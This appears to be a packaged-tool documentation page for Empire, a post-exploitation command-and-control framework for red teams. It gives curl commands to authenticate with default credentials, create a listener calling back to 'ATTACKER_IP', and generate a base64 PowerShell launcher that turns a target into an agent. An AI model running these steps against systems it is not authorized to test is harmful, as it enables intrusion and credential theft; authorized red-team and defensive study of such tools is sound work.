---
name: "empire"
categories:
  - blackarch-automation
version: "v6.7.1.r0.gca5b774"
homepage: "https://github.com/BC-SECURITY/Empire"
packaged-by: [blackarch]
blackarch-builddate: "2026-08-02"
build-system: scripts
license: BSD-3-Clause
meta-checked: "2026-11-09"
github-repo: "BC-SECURITY/Empire"
github-stars: 5348
github-pushed: "2026-09-08"
github-archived: false
github-issues: 23
github-match: "exact"
gh-checked: "2026-11-07"
worth: 8.4
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 354
gh-activity-checked: "2026-11-09"
---

# empire

> Post-exploitation and adversary-emulation framework: PowerShell/Python/C#/Go agents driven over a REST API and the Starkiller web GUI.

## What it's for

Empire is a C2 framework for red teams and pentesters: a Python server hosts listeners (HTTP/S, malleable HTTP, SMB, hop/pivot listeners), generates stagers for its agents, and tasks them with a large module library — Mimikatz, Seatbelt, Rubeus, Certify, .NET assembly and BOF execution — mapped to MITRE ATT&CK. Agents exist for PowerShell, Python 3, C#, IronPython, and Go, with integrated obfuscation and JA3/JARM evasion. Operators work through the Starkiller web GUI or the FastAPI REST API served on port 1337; note that the old interactive terminal console (the `listeners` / `usestager` / `agents` / `interact` menus) was removed in 6.0, so automate against the API or the GUI — that classic listener → stager → agent flow is now Starkiller's UI layout and the API's resource model. The first server start creates the database and default credentials `empireadmin` / `password123`.

## Typical use cases

### Start the server

Bring up the API, GUI, and database (from a source checkout the equivalent is `./ps-empire server`; useful flags: `--debug`, `--reset` to reinitialize the database, `--config <file>`).

```
empire server
```

Outcome: initializes the database if needed and serves the REST API plus the bundled Starkiller GUI on port 1337 (bind address, port, and TLS come from `api.ip` / `api.port` / `api.secure` in `empire/server/config.yaml`); open http://127.0.0.1:1337 and log in to Starkiller to operate.

### Authenticate to the REST API

Get the JWT every API call needs.

```
TOKEN=$(curl -s -X POST http://127.0.0.1:1337/token -d 'username=empireadmin&password=password123' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
```

Outcome: `$TOKEN` holds the JWT to send as `Authorization: Bearer $TOKEN` on subsequent calls; the live Swagger/OpenAPI reference for all endpoints is served at `/docs`.

### Create an HTTP listener

Open the channel agents will stage and communicate over.

```
curl -s -X POST http://127.0.0.1:1337/api/v2/listeners -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"name":"http1","template":"http","options":{"Name":"http1","Host":"http://ATTACKER_IP","BindIP":"0.0.0.0","Port":"8080","StagingKey":"2c103f2c4ed1e59c0b4e2e01821770fa"}}'
```

Outcome: a running listener named http1 validated against the `http` listener template; list available templates and their required options with `GET /api/v2/listener-templates`.

### Generate a PowerShell launcher stager

Produce the one-liner that turns a target into an agent.

```
curl -s -X POST http://127.0.0.1:1337/api/v2/stagers -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"name":"ps1","template":"multi_launcher","options":{"Listener":"http1","Language":"powershell","Base64":"True","SafeChecks":"True"}}'
```

Outcome: a saved stager whose response contains the generated one-line `powershell` launcher; executing it on a target produces an Empire agent on http1. File-based stagers (e.g. template `windows/hta`, `windows/dll`) return a download URI for the artifact instead.

### List checked-in agents

See what you hold before tasking.

```
curl -s http://127.0.0.1:1337/api/v2/agents -H "Authorization: Bearer $TOKEN"
```

Outcome: a JSON array of agents with name, hostname, internal IP, and check-in metadata — the record you need before tasking one through `/api/v2/agents/<name>/tasks`.
